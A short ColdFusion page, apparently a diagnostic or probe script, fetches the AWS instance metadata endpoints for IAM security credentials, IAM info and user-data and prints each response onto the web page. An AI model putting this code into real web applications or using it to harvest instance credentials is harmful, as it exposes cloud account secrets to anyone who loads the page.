<!---
  Created with IntelliJ IDEA.
  User: larshueper
  Date: 18.04.16
  Time: 22:19
--->
<cfhttp url="http://169.254.169.254/latest/meta-data/iam/security-credentials/" method="get"></cfhttp>
<cfoutput>credentials: #cfhttp.filecontent#<br></cfoutput>
<cfhttp url="http://169.254.169.254/latest/meta-data/iam/info/" method="get"></cfhttp>
<cfoutput>info: <pre>#cfhttp.filecontent#</pre><br></cfoutput>
<cfhttp url="http://169.254.169.254/latest/user-data/" method="get"></cfhttp>
<cfoutput>user-data: <pre>#cfhttp.filecontent#</pre><br></cfoutput>
